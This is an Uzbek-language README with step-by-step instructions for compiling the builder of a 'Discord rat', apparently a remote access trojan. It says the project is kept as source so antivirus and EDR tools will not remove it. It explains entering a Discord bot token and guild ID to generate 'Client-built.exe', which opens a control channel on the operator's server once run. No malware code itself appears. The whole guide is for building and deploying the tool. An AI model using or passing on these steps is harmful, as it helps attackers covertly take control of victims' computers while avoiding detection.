# Builder (`builder.exe`) ni Kompilyatsiya Qilish va Yuklab Olish Bo'yicha Qo'llanma

Ushbu loyihada tayyor `.exe` fayllari (binary) xavfsizlik va xakerlikga qarshi avtomatik skanerlar (AV/EDR) tomonidan o'chirib tashlanmasligi hamda kodingiz toza bo'lishi uchun **source code (manba kodi)** shaklida saqlanadi.

`builder.exe` faylini o'zingiz kompyuteringizda tez va oson yig'ib (build qilib) olishingiz mumkin.

---

## 🛠️ 1. Kerakli Dasturlar (Prerequisites)

Dasturni yig'ish uchun kompyuteringizda quyidagilar o'rnatilgan bo'lishi kerak:
1. **Visual Studio 2019 / 2022** (yoki MSBuild CLI / .NET Framework SDK).
   - *Workload:* **.NET desktop development** (C# Windows Forms support).
2. **Git** (Kodni yuklab olish uchun).

---

## 📥 2. Repozitoriyani Yuklab Olish (Clone)

Command Prompt (`cmd`) yoki PowerShell-ni oching va quyidagi buyruqni bajaring:

```bash
git clone https://github.com/USERNAME/REPO_NAME.git
cd REPO_NAME
```

---

## 🏗️ 3. `builder.exe` Faylini Yig'ish (Build Step-by-Step)

### Visual Studio Orqali Yig'ish (Tavsiya etiladi):
1. **`Discord rat.sln`** faylini Visual Studio-da oching.
2. **Solution Explorer** oynasida `Discord rat` loyihasini o'ng bosing va **Build**-ni bosing (Rejimni **Release / x64** ga qo'ying).
   - Yig'ilgan `Discord rat.exe` fayli `Discord rat/bin/Release/Discord rat.exe` manzilida hosil bo'ladi.
3. Hosil bo'lgan `Discord rat.exe` faylini `Release/` papkasiga nusxalab qo'ying (yoki `builder/bin/Release/Release/` papkasiga).
4. **Solution Explorer** oynasida `builder` loyihasini o'ng bosing va **Build** tugmasini bosing.
5. Tayyor `builder.exe` fayli **`builder/bin/Release/builder.exe`** manzilida hosil bo'ladi!

### MSBuild CLI (Buyruqlar satri) Orqali Yig'ish:
Agar Visual Studio interfeysisiz yig'moqchi bo'lsangiz:

```cmd
msbuild "Discord rat.sln" /p:Configuration=Release /p:Platform="Any CPU"
```
Yig'ilgan fayllar `builder/bin/Release/` papkasida paydo bo'ladi.

---

## ⚡ 4. Builder-dan Foydalanish (`Client-built.exe` yaratish)

1. `builder/bin/Release/builder.exe` dasturini ishga tushiring.
2. **Discord Bot Token** va **Discord Guild ID** maydonlariga o'zingizning Discord Bot ma'lumotlaringizni kiriting.
3. **Build Client** tugmasini bosing.
4. Dastur shu papkaning o'zida **`Client-built.exe`** faylini yaratib beradi.
5. Ushbu `Client-built.exe` ishga tushirilganda Discord serveringizda avtomatik ravishda yangi boshqaruv kanali ochiladi.
